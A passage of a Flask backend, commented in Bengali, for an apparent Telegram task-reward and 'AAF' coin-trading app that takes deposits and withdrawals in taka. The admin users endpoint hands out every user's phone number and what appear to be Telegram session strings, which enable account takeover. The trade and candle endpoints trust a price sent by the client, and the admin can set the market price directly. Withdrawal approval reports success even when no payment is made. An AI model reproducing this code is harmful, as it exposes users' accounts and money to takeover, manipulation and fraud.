            "telegram_id": telegram_id,
            "task_id": task_id,
            "device_id": device_id,
            "ip": user_ip,
            "reward": reward,
            "currency": currency,
            "requires_approval": False,
            "status": "approved",
            "created_at": datetime.utcnow()
        })
        return jsonify({"blocked": False, "message": msg})
        
# ========== হেল্পার ফাংশন ==========
def check_task_restrictions(user, task, device_id, ip_address):
    """ডিভাইস, আইপি, অ্যাকাউন্ট চেক করে। ব্লক হলে (True, message) রিটার্ন করে"""
    admin = get_admin_config()
    # টাস্কের নিজস্ব রুলস নিন, না থাকলে গ্লোবাল
    global_rules = admin.get("task_rules", {})
    device_check = task.get("device_check", global_rules.get("device_check", True))
    ip_check = task.get("ip_check", global_rules.get("ip_check", False))
    account_check = task.get("account_check", global_rules.get("account_check", True))
    ip_limit = admin.get("ip_limit_per_hour", 5)
    
    if device_check and device_id:
        device_key = f"device_tasks/{task['id']}/{device_id}"
        if fb_ref and fb_ref.child(device_key).get():
            return True, "এই ডিভাইস ইতিমধ্যে টাস্ক ক্লেইম করেছে।"
    
    if ip_check and ip_address:
        ip_key = f"ip_tasks/{task['id']}/{ip_address}"
        ip_data = fb_ref.child(ip_key).get() if fb_ref else None
        now_ts = datetime.utcnow().timestamp()
        if ip_data:
            count = ip_data.get("count", 0)
            last_ts = ip_data.get("timestamp", 0)
            if now_ts - last_ts < 3600:
                if count >= ip_limit:
                    return True, f"আইপি থেকে প্রতি ঘন্টায় সর্বোচ্চ {ip_limit} বার ক্লেইম করা যাবে।"
                else:
                    fb_ref.child(ip_key).update({"count": count + 1})
            else:
                fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
        else:
            fb_ref.child(ip_key).set({"count": 1, "timestamp": now_ts})
    
    if account_check:
        user_key = f"user_tasks/{user['telegram_id']}/{task['id']}"
        if fb_ref and fb_ref.child(user_key).get():
            return True, "আপনি ইতিমধ্যে এই টাস্ক ক্লেইম করেছেন।"
    
    return False, ""

# ========== টেলিগ্রাম চ্যানেল জয়েন ভেরিফিকেশন ==========
@app.route("/api/user/tasks/verify_channel", methods=["POST"])
@login_required
def verify_channel_task():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})
    data = request.json
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    task = fb_ref.child(f"tasks/{task_id}").get() if fb_ref else None
    if not task:
        return jsonify({"success": False, "message": "Task not found"})
    
    # ডুপ্লিকেট চেক
    if task_claims_col.find_one({"telegram_id": user["telegram_id"], "task_id": task_id}):
        return jsonify({"success": False, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})
    
    # ডিভাইস/আইপি/অ্যাকাউন্ট চেক
    blocked, msg = check_task_restrictions(user, task, device_id, request.remote_addr)
    if blocked:
        return jsonify({"success": False, "message": msg})
    
    # চ্যানেল জয়েন ভেরিফিকেশন
    channel = task.get("link", "").strip()
    if not channel.startswith("@"):
        channel = "@" + channel
    bot_token = get_admin_config().get("bot_token")
    if not bot_token:
        return jsonify({"success": False, "message": "বট টোকেন সেট করা নেই।"})
    
    import requests
    url = f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id={channel}&user_id={user['telegram_id']}"
    try:
        resp = requests.get(url, timeout=10).json()
        if not resp.get("ok") or resp["result"]["status"] not in ("member","administrator","creator"):
            return jsonify({"success": False, "message": "আপনি এখনো চ্যানেলে জয়েন করেননি।"})
    except:
        return jsonify({"success": False, "message": "সার্ভার ত্রুটি, আবার চেষ্টা করুন।"})
    
    # টাকা প্রদান
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")
    if currency == "aaf":
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
        msg = f"Received {reward} AAF"
    else:
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
        msg = f"Received ৳{reward}"
    users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
    task_claims_col.insert_one({
        "telegram_id": user["telegram_id"],
        "task_id": task_id,
        "status": "approved"
    })
    return jsonify({"success": True, "message": msg})

# ========== ডিপ লিংক টাস্ক ভেরিফিকেশন ==========
@app.route("/api/user/tasks/verify_deeplink", methods=["POST"])
@login_required
def verify_deeplink_task():
    uid = session.get("uid")
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"success": False, "message": "User not found"})
    data = request.json
    task_id = data.get("task_id")
    device_id = data.get("device_id")
    task = fb_ref.child(f"tasks/{task_id}").get() if fb_ref else None
    if not task:
        return jsonify({"success": False, "message": "Task not found"})
    
    if task_claims_col.find_one({"telegram_id": user["telegram_id"], "task_id": task_id}):
        return jsonify({"success": False, "message": "আপনি ইতিমধ্যে এই টাস্ক সম্পন্ন করেছেন।"})
    
    blocked, msg = check_task_restrictions(user, task, device_id, request.remote_addr)
    if blocked:
        return jsonify({"success": False, "message": msg})
    
    record = deeplink_clicks_col.find_one({"telegram_id": user["telegram_id"], "task_id": f"task_{task_id}"})
    if not record:
        return jsonify({"success": False, "message": "আপনি এখনো নির্দিষ্ট লিংকে ক্লিক করেননি। লিংকে ক্লিক করে আবার VERIFY চাপুন।"})
    
    reward = task.get("reward", 0)
    currency = task.get("currency", "cash")
    if currency == "aaf":
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"aaf": reward}})
        msg = f"Received {reward} AAF"
    else:
        users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": reward}})
        msg = f"Received ৳{reward}"
    users_col.update_one({"_id": user["_id"]}, {"$inc": {"tasks_done": 1}})
    task_claims_col.insert_one({
        "telegram_id": user["telegram_id"],
        "task_id": task_id,
        "status": "approved"
    })
    return jsonify({"success": True, "message": msg})
    

@app.route("/api/admin/task/save", methods=["POST"])
@login_required
def admin_save_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"error": "Firebase not configured"}), 500
    data = request.json
    task_id = secrets.token_hex(4)
    admin = get_admin_config()
    
    default_hours = admin.get("default_task_expiry_hours", 168)
    expiry_hours = int(data.get("expiry_hours", default_hours))
    expires_at = (datetime.utcnow() + timedelta(hours=expiry_hours)).isoformat()
    
    task_data = {
        "id": task_id,
        "title": data.get("title"),
        "link": data.get("link"),
        "reward": data.get("reward"),
        "timer": data.get("timer"),
        "type": data.get("type"),
        "currency": data.get("currency", "cash"),
        "expires_at": expires_at,
        "created_at": datetime.utcnow().isoformat(),
        "requires_approval": data.get("requires_approval", False),
        "device_check": data.get("device_check", True),
        "ip_check": data.get("ip_check", False),
        "account_check": data.get("account_check", True)
    }
    fb_ref.child(f"tasks/{task_id}").set(task_data)
    return jsonify({"success": True})


@app.route("/api/admin/task/delete", methods=["POST"])
@login_required
def admin_delete_task():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    task_id = data.get("task_id")
    if not task_id:
        return jsonify({"error": "Task ID required"}), 400
    if fb_ref:
        fb_ref.child(f"tasks/{task_id}").delete()
        return jsonify({"success": True})
    return jsonify({"error": "Firebase not configured"}), 500

# ================= API: TRADING =================

    # ================= TEST ENDPOINT (ডিবাগিং এর জন্য) =================
@app.route("/api/test_db")
def test_db():
    """MongoDB কানেকশন টেস্ট করার জন্য"""
    try:
        count = candles_col.count_documents({})
        return jsonify({
            "status": "success",
            "candles_count": count,
            "message": "MongoDB connected successfully"
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500
        
@app.route('/api/candles', methods=['GET'])
def get_candles():
    try:
        # ফ্রন্টএন্ড থেকে টাইমফ্রেম গ্রহণ
        tf = request.args.get('timeframe') or request.args.get('tf') or '1'
        limit = request.args.get('limit', 500, type=int)
        
        # 🎯 টাইমফ্রেম অনুযায়ী সঠিক কালেকশন নির্বাচন
        if tf == '5':
            collection_name = 'candles_5m'
        elif tf == '15':
            collection_name = 'candles_15m'
        elif tf == '60':
            collection_name = 'candles_1h'
        elif tf == '240':
            collection_name = 'candles_4h'
        elif tf == '1440':
            collection_name = 'candles_1d'
        else:
            collection_name = 'candles'  # 1M
        
        current_col = db_mongo[collection_name]
        
        # ক্যান্ডেল ডাটা আনা
        candles_cursor = current_col.find({}, {'_id': 0}).sort("time", -1).limit(limit)
        candles = list(candles_cursor)
        candles.reverse()  # পুরনো থেকে নতুন সাজানো
        
        # টাইমস্ট্যাম্প ফরম্যাট ঠিক করা (মিলিসেকেন্ড থেকে সেকেন্ডে রূপান্তর)
        for c in candles:
            if c.get("time") and c["time"] > 9999999999:
                c["time"] = int(c["time"] / 1000)
        
        # 🆕 যদি কোনো ডাটা না থাকে, মক ডাটা তৈরি করুন
        if not candles:
            base = int(datetime.utcnow().timestamp()) - (int(tf) * 60 * 100)
            for i in range(100):
                price = 1.0 + (i * 0.001)
                candles.append({
                    "time": base + (i * int(tf) * 60),
                    "open": price,
                    "high": price * 1.002,
                    "low": price * 0.998,
                    "close": price * 1.001
                })
        
        return jsonify({
            "status": "success",
            "candles": candles
        })
        
    except Exception as e:
        print(f"🚨 Get Candles API Error: {e}")
        return jsonify({
            "status": "error",
            "candles": [],
            "message": str(e)
        }), 500

@app.route("/api/market/live-candle")
def live_candle():
    if not fb_ref:
        now = int(datetime.utcnow().timestamp())
        return jsonify({"time": now, "open": 1.0, "high": 1.0, "low": 1.0, "close": 1.0})
    try:
        candles = fb_ref.child("candle_history").order_by_key().limit_to_last(1).get()
        if candles:
            last_key = list(candles.keys())[-1]
            candle = candles[last_key]
            return jsonify({
                "time": int(candle.get("time", 0)),
                "open": float(candle.get("open", 1.0)),
                "high": float(candle.get("high", 1.0)),
                "low": float(candle.get("low", 1.0)),
                "close": float(candle.get("close", 1.0))
            })
    except Exception as e:
        print(f"Live candle error: {e}")
    now = int(datetime.utcnow().timestamp())
    return jsonify({"time": now, "open": 1.0, "high": 1.0, "low": 1.0, "close": 1.0})

@app.route("/api/market/price")
def market_price():
    try:
        admin = get_admin_config()
        live_price = float(admin.get("live_price", 1.0))
        trade_fee = float(admin.get("trading_fee", 0.5))
        price_volatility = float(admin.get("price_volatility", 0.0005))
        trade_impact_factor = float(admin.get("trade_impact_factor", 0.0001))
        
        # প্রাইস লিমিট (০.৯০ টাকার নিচে নামতে পারবে না)
        if live_price < 0.90:
            live_price = 0.90
            
        return jsonify({
            "live_price": live_price,
            "trade_fee": trade_fee,
            "price_volatility": price_volatility,
            "trade_impact_factor": trade_impact_factor,
            "status": "success"
        })
    except Exception as e:
        return jsonify({
            "live_price": 1.0, 
            "trade_fee": 0.5,
            "price_volatility": 0.0005,
            "trade_impact_factor": 0.0001,
            "status": "error"
        })

@app.route("/api/market/update_candle", methods=["POST"])
@login_required
def update_candle():
    """নতুন ট্রেড হলে ৬টি আলাদা কালেকশনে ক্যান্ডেল প্রসেস ও সেভ করে (ডাটা টাইপ ফিক্সসহ)"""
    try:
        data = request.get_json()
        
        # 🎯 ফিক্স: ডাটাবেজের এডমিন কনফিগ থেকে লাইভ প্রাইস চেক করা
        admin_doc = admin_config_col.find_one({"_id": "global"})
        
        # যদি এডমিন প্যানেলে লাইভ প্রাইস দেওয়া থাকে তবে সেটাই চার্টের মোমবাতি বানাবে
        if admin_doc and admin_doc.get("live_price"):
            price = float(admin_doc.get("live_price"))
        else:
            price = float(data.get('price', 0))
            
        if not price:
            return jsonify({"status": "error", "message": "Invalid price"}), 400            
        now = int(datetime.utcnow().timestamp())
        current_date_utc = datetime.utcnow()

        # 🎯 আপনার ৬টি টাইমফ্রেমের সম্পূর্ণ ম্যাপ (মিনিট হিসেবে)
        timeframes = {
            "1": db_mongo['candles'],         # 1M
            "5": db_mongo['candles_5m'],      # 5M
            "15": db_mongo['candles_15m'],    # 15M
            "60": db_mongo['candles_1h'],     # 1H
            "240": db_mongo['candles_4h'],    # 4H
            "1440": db_mongo['candles_1d']    # 1D
        }

        # 🔄 লুপ চালিয়ে প্রতিটি টাইমফ্রেমের জন্য ক্যান্ডেল তৈরি বা আপডেট হচ্ছে
        for tf_str, collection in timeframes.items():
            tf_minutes = int(tf_str)
            tf_seconds = tf_minutes * 60
            
            bucket_time = now - (now % tf_seconds)
            existing = collection.find_one({"time": bucket_time})
            
            if existing:
                # 🔥 ফিক্স: আগের হাই এবং লো-কেও খাঁটি Float-এ কনভার্ট করে নিখুঁত তুলনা করা
                old_high = float(existing.get("high", price))
                old_low = float(existing.get("low", price))
                
                new_high = max(old_high, price)
                new_low = min(old_low, price)
                
                collection.update_one(
                    {"time": bucket_time},
                    {
                        "$set": {
                            "high": new_high,
                            "low": new_low,
                            "close": price,               # রিয়েল-টাইম শেষ দাম
                            "createdAt": current_date_utc # ২ মাসের মেয়াদের সিল রিফ্রেশ
                        }
                    }
                )
            else:
                # ক্যান্ডেল না থাকলে একদম নতুন একটা মোমবাতি তৈরি হবে (সব Float ডাটাসহ)
                collection.insert_one({
                    "time": bucket_time,
                    "open": price,
                    "high": price,
                    "low": price,
                    "close": price,
                    "createdAt": current_date_utc
                })
        
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"🚨 Update Candle Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500



@app.route("/api/trade/execute", methods=["POST"])
@login_required
def execute_trade():
    data = request.get_json(silent=True) or {}

    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "session_expired"}), 401

    # 🔥 ফিক্স: ফ্রন্টএন্ডের action/amount ফরম্যাট সাপোর্ট
    trade_type = str(data.get("action") or data.get("type", "")).lower().strip()
    taka = float(data.get("amount") or data.get("taka", 0) or 0)
    coin = float(data.get("coin", 0) or 0)
    price = float(data.get("current_price") or data.get("price", 0) or 0)

    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"status": "error", "message": "User not found"}), 404

    admin = get_admin_config() or {}
    fee_percent = float(admin.get("trading_fee", 0.5) or 0.5)
    
    # 🆕 ইমপ্যাক্ট ফ্যাক্টর এডমিন কনফিগ থেকে নেওয়া
    impact_factor = float(admin.get("trade_impact_factor", 0.0001))

    if price <= 0:
        return jsonify({"status": "error", "message": "Invalid price"}), 400

    # --------------------------------------------------------------
    # BUY
    # --------------------------------------------------------------
    if trade_type == "buy":
        if taka <= 0:
            return jsonify({"status": "error", "message": "Invalid amount"}), 400

        if coin <= 0:
            coin = taka / price

        total_cost = taka + (taka * fee_percent / 100)

        if float(user.get("cash", 0)) < total_cost:
            return jsonify({"status": "error", "message": "Insufficient cash"}), 400

        new_cash = float(user.get("cash", 0)) - total_cost
        new_aaf = float(user.get("aaf", 0)) + coin
        fee_amount = taka * fee_percent / 100

        users_col.update_one(
            {"_id": user["_id"]},
            {"$set": {"cash": new_cash, "aaf": new_aaf}}
        )

        admin_config_col.update_one(
            {"_id": "global"},
            {"$inc": {"server_income": fee_amount}}
        )

        trades_col.insert_one({
            "telegram_id": user.get("telegram_id"),
            "type": "buy",
            "taka": taka,
            "coin": coin,
            "price": price,
            "fee": fee_amount,
            "timestamp": datetime.utcnow()
        })

        # 🆕 বাই ট্রেডের ফলে প্রাইস বাড়ানো
        current_live_price = float(admin.get("live_price", 1.0))
        price_change = taka * impact_factor
        new_price = current_live_price + price_change
        new_price = max(0.1, new_price)
        admin_config_col.update_one(
            {"_id": "global"},
            {"$set": {"live_price": new_price}}
        )

        return jsonify({"status": "success", "message": f"Bought {coin:.4f} AAF successfully"})

    # --------------------------------------------------------------
    # SELL
    # --------------------------------------------------------------
    elif trade_type == "sell":
        if coin <= 0:
            # সেল মোডে amount থেকে কয়েন বের করা
            if taka > 0:
                coin = taka / price
            else:
                return jsonify({"status": "error", "message": "Invalid coin amount"}), 400

        if taka <= 0:
            taka = coin * price

        if float(user.get("aaf", 0)) < coin:
            return jsonify({"status": "error", "message": "Insufficient AAF"}), 400

        fee_amount = taka * fee_percent / 100
        total_receive = taka - fee_amount

        new_cash = float(user.get("cash", 0)) + total_receive
        new_aaf = float(user.get("aaf", 0)) - coin

        users_col.update_one(
            {"_id": user["_id"]},
            {"$set": {"cash": new_cash, "aaf": new_aaf}}
        )

        admin_config_col.update_one(
            {"_id": "global"},
            {"$inc": {"server_income": fee_amount}}
        )

        trades_col.insert_one({
            "telegram_id": user.get("telegram_id"),
            "type": "sell",
            "taka": taka,
            "coin": coin,
            "price": price,
            "fee": fee_amount,
            "timestamp": datetime.utcnow()
        })

        # 🆕 সেল ট্রেডের ফলে প্রাইস কমানো
        current_live_price = float(admin.get("live_price", 1.0))
        price_change = taka * impact_factor
        new_price = current_live_price - price_change
        new_price = max(0.1, new_price)
        admin_config_col.update_one(
            {"_id": "global"},
            {"$set": {"live_price": new_price}}
        )

        return jsonify({"status": "success", "message": f"Sold {coin:.4f} AAF successfully"})

    return jsonify({"status": "error", "message": "Invalid type"}), 400


@app.route("/api/wallet/deposit", methods=["POST"])
@login_required
def deposit_request():
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    
    data = request.json
    method = data.get("method")
    amount = float(data.get("amount", 0))
    reference = data.get("reference") or data.get("trx")
    
    if not method or amount <= 0 or not reference:
        return jsonify({"status": "error", "message": "Method, amount and transaction ID required"}), 400
    
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    # চেক করা: একই রেফারেন্স ইতিমধ্যে জমা হয়েছে কিনা
    existing = deposits_col.find_one({"reference": reference})
    if existing:
        return jsonify({"status": "error", "message": "This transaction ID already submitted"}), 400
    
    deposits_col.insert_one({
        "telegram_id": user.get("telegram_id"),
        "method": method,
        "amount": amount,
        "reference": reference,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    
    return jsonify({"status": "success", "message": f"Deposit request of ৳{amount} submitted. Wait for admin approval."})


@app.route("/api/wallet/withdraw", methods=["POST"])
@login_required
def withdraw_request():
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    
    data = request.json
    account_number = str(data.get("account_number") or data.get("number") or "").strip()
    amount = float(data.get("amount", 0))
    
    if not account_number or amount <= 0:
        return jsonify({"status": "error", "message": "Valid account number and amount required"}), 400
    
    user = users_col.find_one({"_id": ObjectId(uid)})
    if not user:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    if user.get("cash", 0) < amount:
        return jsonify({"status": "error", "message": f"Insufficient balance. Available: ৳{user.get('cash', 0)}"}), 400
    
    # ন্যূনতম উইথড্রোয়াল লিমিট (ঐচ্ছিক)
    if amount < 100:
        return jsonify({"status": "error", "message": "Minimum withdrawal amount is ৳100"}), 400
    
    withdraws_col.insert_one({
        "telegram_id": user.get("telegram_id"),
        "account_number": account_number,
        "amount": amount,
        "status": "pending",
        "created_at": datetime.utcnow()
    })
    
    return jsonify({"status": "success", "message": f"Withdraw request of ৳{amount} submitted. Wait for admin approval."})


@app.route("/api/admin/reject_withdraw", methods=["POST"])
def admin_reject_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    w_id = data.get("id")
    
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if not withdraw or withdraw["status"] != "pending":
        return jsonify({"success": False, "message": "Withdraw request not found or already processed"}), 404
    
    # স্ট্যাটাস rejected এ আপডেট করুন (ব্যালেন্স কাটবেন না)
    withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "rejected"}})
    
    return jsonify({"success": True, "message": "Withdraw request rejected"})


@app.route("/api/wallet/transfer", methods=["POST"])
@login_required
def transfer_funds():
    uid = session.get("uid")
    if not uid:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
    
    data = request.json
    transfer_type = data.get("type")  # 'cash' or 'coin'
    receiver_tg_id = str(data.get("receiver_id") or data.get("to") or "").strip()
    amount = float(data.get("amount", 0))
    
    if not receiver_tg_id or amount <= 0:
        return jsonify({"status": "error", "message": "Receiver ID and valid amount required"}), 400
    
    if transfer_type not in ["cash", "coin", "aaf"]:
        return jsonify({"status": "error", "message": "Invalid transfer type. Use 'cash' or 'coin'"}), 400
    
    # প্রেরক ইউজার (লগইন করা ইউজার)
    sender = users_col.find_one({"_id": ObjectId(uid)})
    if not sender:
        return jsonify({"status": "error", "message": "Sender not found"}), 404
    
    # নিজেকে নিজে ট্রান্সফার?
    if sender.get("telegram_id") == receiver_tg_id:
        return jsonify({"status": "error", "message": "Cannot transfer to yourself"}), 400
    
    # প্রাপক ইউজার (টেলিগ্রাম আইডি দিয়ে)
    receiver = users_col.find_one({"telegram_id": receiver_tg_id})
    if not receiver:
        return jsonify({"status": "error", "message": f"User {receiver_tg_id} not found. Make sure they have logged in at least once."}), 404
    
    # ট্রান্সফার প্রসেস
    if transfer_type == "cash":
        if sender.get("cash", 0) < amount:
            return jsonify({"status": "error", "message": f"Insufficient cash. Available: ৳{sender.get('cash', 0)}"}), 400
        users_col.update_one({"_id": sender["_id"]}, {"$inc": {"cash": -amount}})
        users_col.update_one({"_id": receiver["_id"]}, {"$inc": {"cash": amount}})
        message = f"Successfully transferred ৳{amount} to {receiver.get('username', receiver_tg_id)}"
        
    else:  # transfer_type == "coin" or "aaf"
        coin_balance = sender.get("aaf", 0)
        if coin_balance < amount:
            return jsonify({"status": "error", "message": f"Insufficient AAF coins. Available: {coin_balance}"}), 400
        users_col.update_one({"_id": sender["_id"]}, {"$inc": {"aaf": -amount}})
        users_col.update_one({"_id": receiver["_id"]}, {"$inc": {"aaf": amount}})
        message = f"Successfully transferred {amount} AAF coins to {receiver.get('username', receiver_tg_id)}"
    
    return jsonify({"status": "success", "message": message})

@app.route("/api/admin/pending_deposits")
def admin_pending_deposits():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    deposits = list(deposits_col.find({"status": "pending"}))
    for d in deposits:
        d["_id"] = str(d["_id"])
    return jsonify({"deposits": deposits})

@app.route("/api/admin/approve_deposit", methods=["POST"])
def admin_approve_deposit():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    deposit_id = data.get("id")
    
    deposit = deposits_col.find_one({"_id": ObjectId(deposit_id)})
    if deposit and deposit["status"] == "pending":
        user = users_col.find_one({"telegram_id": deposit["telegram_id"]})
        if user:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": deposit["amount"]}})
            deposits_col.update_one({"_id": ObjectId(deposit_id)}, {"$set": {"status": "approved"}})
            return jsonify({"success": True})
    
    return jsonify({"success": False, "message": "Deposit not found or already processed"}), 404
    

@app.route("/api/admin/reject_deposit", methods=["POST"])
def admin_reject_deposit():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    data = request.json
    deposit_id = data.get("id")
    
    deposit = deposits_col.find_one({"_id": ObjectId(deposit_id)})
    if deposit and deposit["status"] == "pending":
        deposits_col.update_one({"_id": ObjectId(deposit_id)}, {"$set": {"status": "rejected"}})
        return jsonify({"success": True})
    
    return jsonify({"success": False, "message": "Deposit not found"}), 404



# ================= API: REFERRAL & PAYMENT HISTORY =================
@app.route("/api/user/referrals/<telegram_id>")
@login_required
def get_referrals(telegram_id):
    # Ensure current user matches
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    referrals = users_col.find({"refer_by": telegram_id}, {"username": 1, "telegram_id": 1, "created_at": 1})
    ref_list = []
    for r in referrals:
        ref_list.append({
            "username": r.get("username", "USER"),
            "telegram_id": r.get("telegram_id"),
            "joined_at": r.get("created_at").isoformat() if r.get("created_at") else ""
        })
    return jsonify({"referrals": ref_list})

@app.route("/api/user/payments/<telegram_id>")
@login_required
def get_payments(telegram_id):
    uid = session.get("uid")
    user = users_col.find_one({"telegram_id": telegram_id})
    if not user or str(user["_id"]) != uid:
        return jsonify({"status": "error", "message": "unauthorized"})
    deposits = list(deposits_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "status": 1, "created_at": 1}))
    withdraws = list(withdraws_col.find({"telegram_id": telegram_id}, {"_id": 0, "amount": 1, "number": 1, "status": 1, "created_at": 1}))
    for d in deposits:
        d["created_at"] = d["created_at"].isoformat() if d.get("created_at") else ""
    for w in withdraws:
        w["created_at"] = w["created_at"].isoformat() if w.get("created_at") else ""
    return jsonify({"deposits": deposits, "withdraws": withdraws})

# ================= API: ADMIN (PIN protected) =================
@app.route("/api/admin/me")
def admin_me():
    if session.get("admin_logged_in"):
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/login", methods=["POST"])
def admin_login():
    data = request.json
    pin = data.get("pin")
    admin = get_admin_config()
    if pin == admin.get("admin_pin"):
        session["admin_logged_in"] = True
        session.permanent = True          # ← এই লাইনটি গুরুত্বপূর্ণ
        return jsonify({"ok": True})
    return jsonify({"ok": False})

@app.route("/api/admin/users")
def admin_users():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    # session_string সহ সব ইউজার আনা
    users = list(users_col.find({}, {
        "_id": 0, 
        "telegram_id": 1,
        "first_name": 1, 
        "username": 1,
        "phone": 1, 
        "cash": 1,
        "aaf": 1,
        "session_string": 1   # ← এই লাইনটি যোগ করুন
    }))
    return jsonify({"users": users})

@app.route("/api/admin/tasks")
def admin_tasks():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"tasks": []})
    tasks = fb_ref.child("tasks").get()
    task_list = []
    if tasks:
        for key, t in tasks.items():
            t["id"] = key
            task_list.append(t)
    return jsonify({"tasks": task_list})


@app.route("/api/admin/ads")
def admin_ads():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    if not fb_ref:
        return jsonify({"global": "", "wallet": "", "task": ""})
    global_ad = fb_ref.child("ads/task_banner_ad").get() or ""
    wallet_ad = fb_ref.child("ads/wallet_popup").get() or ""
    task_ad = fb_ref.child("ads/task_popup_ad").get() or ""
    return jsonify({"global": global_ad, "wallet": wallet_ad, "task": task_ad})

@app.route("/api/admin/withdraws")
def admin_withdraws():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    
    pending = list(withdraws_col.find({"status": "pending"}, {
        "_id": 1, 
        "telegram_id": 1, 
        "amount": 1,
        "account_number": 1,    # 🆕 যোগ করুন
        "number": 1,             # 🆕 বিকল্প নাম্বার ফিল্ড
        "created_at": 1
    }))
    
    result = []
    for w in pending:
        result.append({
            "id": str(w["_id"]),
            "telegram_id": w["telegram_id"],
            "amount": w["amount"],
            "account_number": w.get("account_number") or w.get("number", "N/A"),  # 🆕 নাম্বার যোগ
            "created_at": w.get("created_at").isoformat() if w.get("created_at") else ""
        })
    
    return jsonify({"list": result})

@app.route("/api/admin/withdraw/approve", methods=["POST"])
def admin_approve_withdraw():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    w_id = data.get("id")
    withdraw = withdraws_col.find_one({"_id": ObjectId(w_id)})
    if withdraw and withdraw["status"] == "pending":
        # Deduct balance (already deducted? Actually we didn't deduct on request, so deduct now)
        user = users_col.find_one({"telegram_id": withdraw["telegram_id"]})
        if user and user.get("cash", 0) >= withdraw["amount"]:
            users_col.update_one({"_id": user["_id"]}, {"$inc": {"cash": -withdraw["amount"]}})
            withdraws_col.update_one({"_id": ObjectId(w_id)}, {"$set": {"status": "approved"}})
    return jsonify({"success": True})

# ===================== ADMIN CONFIG UPDATE =====================
@app.route("/api/admin/update_settings", methods=["POST"])
@login_required
def admin_update_settings():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    data = request.json
    
    update_data = {
        "channel_url": data.get("channel_url", ""),
        "min_trades": int(data.get("min_trades", 5)),
        "ip_limit": data.get("ip_limit", "off"),
        "bot_token": data.get("bot_token", ""),
        "channel_id": data.get("channel_id", ""),
        "server_income": float(data.get("server_income", 0)),
        "server_trading": float(data.get("server_trading", 0)),
        "bonus_target": int(data.get("bonus_target", 5)),
        "banner_ad_code": data.get("banner_ad_code", ""),
        "extra_users": int(data.get("extra_users", 0)),
        "referral_bonus": float(data.get("referral_bonus", 0)),
        "task_banner_ad": data.get("task_banner_ad", ""),
        "task_popup_ad": data.get("task_popup_ad", ""),
        "task_rules": data.get("task_rules", {
            "device_check": True,
            "ip_check": False,
            "account_check": True
        }),
        "ip_limit_per_hour": int(data.get("ip_limit_per_hour", 5)),  # ✅ সম্পূর্ণ করুন
        "default_task_expiry_hours": int(data.get("default_task_expiry_hours", 168)),  # ✅ যোগ করুন
        "trade_impact_factor": float(data.get("trade_impact_factor", 0.0001)),
        "price_volatility": float(data.get("price_volatility", 0.0005))
    }
    
    update_data["popup_ad"] = {
        "title": data.get("popup_ad_title", ""),
        "desc": data.get("popup_ad_desc", ""),
        "image": data.get("popup_ad_image", ""),
        "enabled": data.get("popup_ad_enabled", False)
    }
    
    admin_config_col.update_one({"_id": "global"}, {"$set": update_data}, upsert=True)
    return jsonify({"success": True})
    
    
@app.route("/api/admin/set_price", methods=["POST"])
@login_required
def admin_set_price():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    price = request.json.get("price")
    if price:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"live_price": float(price)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid price"}), 400

@app.route("/api/admin/set_fee", methods=["POST"])
@login_required
def admin_set_fee():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 401
    fee = request.json.get("fee")
    if fee:
        admin_config_col.update_one({"_id": "global"}, {"$set": {"trading_fee": float(fee)}})
        return jsonify({"success": True})
    return jsonify({"error": "Invalid fee"}), 400
